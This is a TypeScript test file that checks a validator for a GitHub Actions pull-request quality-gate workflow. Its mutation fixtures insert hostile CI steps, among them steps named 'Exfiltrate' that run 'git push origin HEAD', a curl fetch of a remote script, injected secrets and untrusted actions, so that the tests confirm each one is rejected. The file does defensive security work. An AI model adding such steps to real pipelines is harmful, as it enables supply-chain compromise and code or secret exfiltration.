import { readFileSync } from "node:fs";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { validateWorkflowContract } from "../src/workflow-contract.js";

const valid = `name: PR Quality Gate

on:
  pull_request:
    branches:
      - master
  workflow_dispatch:

permissions:
  contents: read

jobs:
  quality-gate:
    runs-on: windows-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          fetch-depth: 0
          ref: \${{ github.event.pull_request.head.sha || github.sha }}
      - uses: actions/setup-node@7c2c68d20d402ed6a201ada70a81341941093140
        with:
          node-version: 24.18.0
          cache: npm
          cache-dependency-path: 04-源文件与代码/package-lock.json
      - name: Verify toolchain versions
        shell: pwsh
        run: |
          if ($(node --version) -ne "v24.18.0") {
            Write-Error "Expected Node.js v24.18.0, got $((node --version))"
            exit 1
          }
          if ($(npm.cmd --version) -ne "11.16.0") {
            Write-Error "Expected npm 11.16.0, got $((npm.cmd --version))"
            exit 1
          }
        working-directory: 04-源文件与代码
      - run: npm.cmd ci --ignore-scripts
        working-directory: 04-源文件与代码
      - name: Report non-accepted environments
        shell: pwsh
        run: |
          Write-Host 'MySQL integration: NOT ACCEPTED (MYSQL_INTEGRATION_URL is intentionally absent).'
          Write-Host 'Object storage/COS: NOT ACCEPTED (credentials are intentionally absent).'
        working-directory: 04-源文件与代码
      - run: npm.cmd run typecheck
        working-directory: 04-源文件与代码
      - run: npm.cmd test -- --run
        working-directory: 04-源文件与代码
      - run: npm.cmd run verify:miniprogram-runtime
        working-directory: 04-源文件与代码
      - run: npm.cmd run build:wechat -w @photo-ai/miniprogram
        working-directory: 04-源文件与代码
      - run: git diff --check origin/master...HEAD
        working-directory: .
`;

const mutationCases: ReadonlyArray<readonly [string, string]> = [
  ["FORBIDDEN_TRIGGER", valid.replace("pull_request:", "pull_request_target:")],
  ["MISSING_TRIGGER", valid.replace("  workflow_dispatch:\n", "")],
  ["EXCESS_PERMISSION", valid.replace("contents: read", "contents: write")],
  ["FLOATING_ACTION", valid.replace(
    "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    "actions/checkout@v7"
  )],
  ["UNAPPROVED_ACTION", valid.replace(
    "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    "untrusted/action@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
  )],
  ["WRONG_RUNNER", valid.replace("windows-latest", "ubuntu-latest")],
  ["WRONG_NODE", valid.replace("node-version: 24.18.0", "node-version: 24")],
  ["WRONG_CACHE_PATH", valid.replace(
    "04-源文件与代码/package-lock.json",
    "package-lock.json"
  )],
  ["WRONG_CHECKOUT", valid.replace("fetch-depth: 0", "fetch-depth: 1")],
  ["WRONG_WORKDIR", valid.replace(
    "run: npm.cmd ci --ignore-scripts\n        working-directory: 04-源文件与代码",
    "run: npm.cmd ci --ignore-scripts\n        working-directory: ."
  )],
  ["FORBIDDEN_INSTALL_SCRIPT", valid.replace(
    "npm.cmd ci --ignore-scripts",
    "npm.cmd ci"
  )],
  ["MISSING_GATE", valid.replace("run: npm.cmd run typecheck", "run: npm.cmd run omitted")],
  ["GATE_ORDER", valid
    .replace("run: npm.cmd run typecheck", "run: __TYPECHECK__")
    .replace("run: npm.cmd test -- --run", "run: npm.cmd run typecheck")
    .replace("run: __TYPECHECK__", "run: npm.cmd test -- --run")],
  ["FILTERED_TESTS", valid.replace(
    "npm.cmd test -- --run",
    "npm.cmd test -- --run apps/api/test/task-service.test.ts"
  )],
  ["FORBIDDEN_SECRET", `${valid}\nenv:\n  TOKEN: \${{ secrets.CLOUD_TOKEN }}\n`],
  ["FORBIDDEN_REMOTE_OPERATION", `${valid}\n      - run: git push origin HEAD\n`],
  ["FORBIDDEN_REMOTE_OPERATION_BLOCK", `${valid}\n      - run: |\n          git push origin master`],
  ["FORBIDDEN_REMOTE_OPERATION_FOLDED", `${valid}\n      - run: >\n          curl https://example.invalid/script.ps1`]
];

const structuredBypassCases: ReadonlyArray<readonly [string, string, string]> = [
  [
    "a remote command in a named inline step",
    `${valid}\n      - name: Exfiltrate\n        run: git push origin HEAD\n`,
    "FORBIDDEN_REMOTE_OPERATION"
  ],
  [
    "a remote command in a named literal block step",
    `${valid}\n      - name: Exfiltrate\n        run: |\n          git push origin HEAD\n`,
    "FORBIDDEN_REMOTE_OPERATION_BLOCK"
  ],
  [
    "a remote command in a named folded block step",
    `${valid}\n      - name: Exfiltrate\n        run: >\n          git push origin HEAD\n`,
    "FORBIDDEN_REMOTE_OPERATION_FOLDED"
  ],
  [
    "an unapproved action in a named step",
    `${valid}\n      - name: Exfiltrate\n        uses: untrusted/action@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n`,
    "UNAPPROVED_ACTION"
  ],
  [
    "job-level write permissions",
    valid.replace(
      "    runs-on: windows-latest",
      "    permissions:\n      contents: write\n    runs-on: windows-latest"
    ),
    "EXCESS_PERMISSION"
  ],
  [
    "an additional push trigger",
    valid.replace(
      "  workflow_dispatch:",
      "  push:\n    branches:\n      - master\n  workflow_dispatch:"
    ),
    "FORBIDDEN_TRIGGER"
  ],
  [
    "an additional schedule trigger",
    valid.replace(
      "  workflow_dispatch:",
      "  schedule:\n    - cron: '0 0 * * *'\n  workflow_dispatch:"
    ),
    "FORBIDDEN_TRIGGER"
  ],
  [
    "an additional job",
    valid.replace(
      "jobs:\n  quality-gate:",
      "jobs:\n  unapproved-job:\n    runs-on: windows-latest\n    steps: []\n  quality-gate:"
    ),
    "UNAPPROVED_JOB"
  ],
  [
    "an additional gate command",
    `${valid}\n      - run: Write-Output unexpected\n        working-directory: .\n`,
    "UNAPPROVED_COMMAND"
  ],
  [
    "an altered npm version check",
    valid.replace('"11.16.0"', '"11.15.0"'),
    "WRONG_NPM"
  ],
  [
    "syntactically invalid YAML",
    valid.replace("jobs:", "jobs: ["),
    "INVALID_YAML"
  ]
];

describe("PR quality-gate workflow contract", () => {
  it("accepts only the minimal trusted workflow", () => {
    expect(validateWorkflowContract(valid)).toEqual([]);
  });

  it.each(mutationCases)("returns %s for a security regression", (code, source) => {
    expect(validateWorkflowContract(source).map((item) => item.code)).toContain(code);
  });

  it.each(structuredBypassCases)(
    "rejects %s that would bypass line-oriented matching",
    (_description, source, code) => {
      expect(validateWorkflowContract(source).map((item) => item.code)).toContain(code);
    }
  );

  it("keeps the committed workflow inside the minimal security contract", () => {
    const here = dirname(fileURLToPath(import.meta.url));
    const workflow = resolve(
      here,
      "../../../../.github/workflows/pr-quality-gate.yml"
    );

    expect(validateWorkflowContract(readFileSync(workflow, "utf8"))).toEqual([]);
  });
});
